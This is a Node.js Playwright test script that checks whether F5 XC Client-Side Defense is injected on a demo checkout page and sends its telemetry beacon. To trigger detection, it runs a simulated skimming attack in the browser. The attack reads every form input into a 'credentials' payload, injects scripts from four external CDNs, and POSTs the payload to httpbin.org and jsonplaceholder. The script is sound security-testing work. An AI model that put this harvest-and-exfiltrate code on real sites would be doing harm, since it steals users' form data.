#!/usr/bin/env node
// CSD Detection Test: Combined Detection Script (the canonical CSD demo driver).
//
// Unlike the csd-demo-attacks suite (which exfils SAME-ORIGIN to /csd-demo/exfil and asserts the
// origin log), this suite triggers the three signals F5 XC Client-Side Defense actually flags, per
// the CSD docs (csd/docs/en/trigger-detection.mdx — the "Combined Detection Script"):
//   1. Form-field harvesting  — read every page-load <input> value (CSD: "field read, High Risk").
//   2. Third-party script injection — append <script> tags from 4 NEW external CDN domains
//      (cdn.jsdelivr.net, esm.sh, unpkg.com, ga.jspm.io) — CSD flags new third-party script domains.
//   3. External data exfiltration — fetch POST to www.httpbin.org + jsonplaceholder.typicode.com.
// CSD only flags third-party scripts from new external domains + external exfil, observed by the
// real browser executing the injected CSD JS and beaconing to *.zeronaught.com. curl cannot trigger
// it. Detection is asynchronous (5-10 min, up to 30) — this script proves the browser-side pipeline
// fired; the CSD statistics plane is asserted separately by webapp-api-protection scripts/csd-verify.sh.
//
// This script's PASS assertion (synchronous, deterministic): the CSD JS loaded from the injection
// beacon host (GET .../__imp_apg__/js/... -> 200) AND the CSD telemetry beacon fired
// (POST .../__imp_apg__/api/dip/v1/dip -> 200). That confirms CSD is injected on the target and the
// browser reported the activity. Absent that, CSD is not enabled on the LB (or not propagated) and
// no amount of waiting will produce statistics — so this is the right thing to gate on.
//
// Usage (via runner.sh): runner.sh csd-detection   (runner passes $TARGET_FQDN as argv[2])

const { chromium } = require('playwright');

const TARGET_FQDN = process.argv[2];
if (!TARGET_FQDN) {
  console.error('Usage: 01-combined-detection.js <TARGET_FQDN>');
  process.exit(1);
}
const BASE_URL = `${process.env.TARGET_PROTOCOL || 'http'}://${TARGET_FQDN}`;
const PAGE_URL = `${BASE_URL}/csd-demo/`;

// The exact CDN + exfil targets from the CSD docs Combined Detection Script.
const CDNS = [
  { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
  { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
  { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
  { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' },
];
const EXFIL = ['https://www.httpbin.org/post', 'https://jsonplaceholder.typicode.com/posts'];

const isCsdJs = (u) => /__imp_apg__\/js\//.test(u);
const isBeacon = (u) => /__imp_apg__\/api\/dip/.test(u);

(async () => {
  let browser;
  try {
    browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
    const context = await browser.newContext({ ignoreHTTPSErrors: true });
    const page = await context.newPage();

    const responses = [];
    page.on('response', (r) => {
      const u = r.url();
      if (isCsdJs(u) || isBeacon(u) || CDNS.some((c) => u.startsWith(c.url.split('/npm')[0])) ||
          EXFIL.some((e) => u.startsWith(e.split('/').slice(0, 3).join('/')))) {
        responses.push({ status: r.status(), method: r.request().method(), url: u });
      }
    });

    // Navigate to a page WITH form fields (the /csd-demo/ checkout page).
    await page.goto(PAGE_URL, { waitUntil: 'networkidle', timeout: 30000 });

    // Run the Combined Detection Script inline (docs recipe: harvest -> inject -> exfil).
    const harvested = await page.evaluate(
      ({ cdns, exfil }) => {
        const inputs = document.querySelectorAll('input');
        const fields = {};
        inputs.forEach((i) => {
          const name = i.name || i.id || i.type;
          fields[name] = i.value || '(empty)';
        });
        cdns.forEach((cdn) => {
          const s = document.createElement('script');
          s.src = cdn.url;
          document.head.appendChild(s);
        });
        const payload = JSON.stringify({
          type: 'combined_demo',
          credentials: fields,
          page: window.location.href,
          timestamp: Date.now(),
        });
        exfil.forEach((url) => {
          const opts = { method: 'POST', mode: 'no-cors', body: payload };
          if (url.includes('jsonplaceholder')) opts.headers = { 'Content-Type': 'application/json' };
          fetch(url, opts).catch(() => {});
        });
        return Object.keys(fields).length;
      },
      { cdns: CDNS, exfil: EXFIL },
    );

    // Dwell so CDN load/error callbacks, exfil fetches, and the CSD beacon all complete.
    await page.waitForTimeout(20000);

    const csdJs = responses.find((r) => isCsdJs(r.url));
    const beacon = responses.find((r) => isBeacon(r.url));
    const cdnHits = responses.filter((r) => CDNS.some((c) => r.url.startsWith(c.url.split('/npm')[0])));
    const exfilHits = responses.filter((r) => EXFIL.some((e) => r.url.startsWith(e.split('/').slice(0, 3).join('/'))));

    console.log(`[CSD Detection] harvested ${harvested} form fields`);
    console.log(`[CSD Detection] CDN script requests: ${cdnHits.length} (${cdnHits.map((r) => r.status).join(',')})`);
    console.log(`[CSD Detection] external exfil requests: ${exfilHits.length} (${exfilHits.map((r) => r.status).join(',')})`);
    console.log(`[CSD Detection] CSD JS load: ${csdJs ? csdJs.status : 'MISSING'}`);
    console.log(`[CSD Detection] CSD telemetry beacon (dip): ${beacon ? beacon.status : 'MISSING'}`);

    if (!csdJs || csdJs.status !== 200) {
      console.error('FAIL: CSD JS not injected on target (CSD not enabled/propagated on the LB).');
      process.exit(1);
    }
    if (!beacon || beacon.status !== 200) {
      console.error('FAIL: CSD telemetry beacon did not fire/return 200 (browser did not report activity).');
      process.exit(1);
    }
    console.log('PASS: CSD injected and browser reported detection activity. Statistics land async (5-10 min).');
    console.log('      Verify with webapp-api-protection scripts/csd-verify.sh (polls the CSD stats plane).');
    process.exit(0);
  } catch (err) {
    console.error(`ERROR: ${err.message}`);
    process.exit(1);
  } finally {
    if (browser) await browser.close();
  }
})();
